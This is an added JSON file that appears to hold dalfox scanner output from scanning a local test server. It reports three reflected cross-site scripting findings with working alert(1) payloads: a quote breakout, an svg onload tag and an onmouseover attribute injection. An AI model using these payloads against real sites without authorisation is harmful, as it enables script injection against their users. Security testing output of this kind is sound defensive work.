@@ -1,0 +1,96 @@
+{
+  "findings": [
+    {
+      "confidence": "high",
+      "confidence_reason": "payload reached an executable position in the parsed response",
+      "cwe": "CWE-79",
+      "data": "http://127.0.0.1:8100/js?q=%22%3Balert%281%29%2F%2F",
+      "detection_method": "reflection",
+      "evidence": "DOM verification successful for param q (JS-context AST)",
+      "inject_type": "inHTML",
+      "location": "Query",
+      "message_id": 606,
+      "message_str": "Triggered XSS Payload (JS-context AST): q=\";alert(1)//",
+      "method": "GET",
+      "param": "q",
+      "payload": "\";alert(1)//",
+      "severity": "High",
+      "type": "V",
+      "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+    },
+    {
+      "confidence": "high",
+      "confidence_reason": "payload reached an executable position in the parsed response",
+      "cwe": "CWE-79",
+      "data": "http://127.0.0.1:8100/search?q=%3Csvg%20onload%3Dalert%281%29%20class%3Ddlx9bbd6d97%3E",
+      "detection_method": "reflection",
+      "evidence": "DOM verification successful for param q (DOM marker)",
+      "inject_type": "inHTML",
+      "location": "Query",
+      "message_id": 606,
+      "message_str": "Triggered XSS Payload (DOM marker): q=<svg onload=alert(1) class=dlx9bbd6d97>",
+      "method": "GET",
+      "param": "q",
+      "payload": "<svg onload=alert(1) class=dlx9bbd6d97>",
+      "severity": "High",
+      "type": "V",
+      "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+    },
+    {
+      "confidence": "high",
+      "confidence_reason": "payload reached an executable position in the parsed response",
+      "cwe": "CWE-79",
+      "data": "http://127.0.0.1:8100/attr?q=%27%20onmouseover%3Dalert%281%29%20class%3Ddlx9bbd6d97%20x%3D%27",
+      "detection_method": "reflection",
+      "evidence": "DOM verification successful for param q (DOM marker)",
+      "inject_type": "inHTML",
+      "location": "Query",
+      "message_id": 606,
+      "message_str": "Triggered XSS Payload (DOM marker): q=' onmouseover=alert(1) class=dlx9bbd6d97 x='",
+      "method": "GET",
+      "param": "q",
+      "payload": "' onmouseover=alert(1) class=dlx9bbd6d97 x='",
+      "severity": "High",
+      "type": "V",
+      "type_description": "Vulnerable - dalfox asserts this input is exploitable; act on it"
+    }
+  ],
+  "meta": {
+    "dalfox_version": "3.2.4",
+    "dedup_mode": "exact",
+    "failed_requests": 0,
+    "findings_count": 3,
+    "incomplete": false,
+    "scan_duration_ms": 29862,
+    "target_summary": [
+      {
+        "findings_count": 1,
+        "status": "findings",
+        "target": "http://127.0.0.1:8100/search?q=hello"
+      },
+      {
+        "findings_count": 1,
+        "status": "findings",
+        "target": "http://127.0.0.1:8100/attr?q=hello"
+      },
+      {
+        "findings_count": 1,
+        "status": "findings",
+        "target": "http://127.0.0.1:8100/js?q=hello"
+      },
+      {
+        "findings_count": 0,
+        "status": "clean",
+        "target": "http://127.0.0.1:8100/safe?q=hello"
+      }
+    ],
+    "targets": [
+      "http://127.0.0.1:8100/search?q=hello",
+      "http://127.0.0.1:8100/attr?q=hello",
+      "http://127.0.0.1:8100/js?q=hello",
+      "http://127.0.0.1:8100/safe?q=hello"
+    ],
+    "targets_deduplicated": 0,
+    "total_requests": 598
+  }
+}
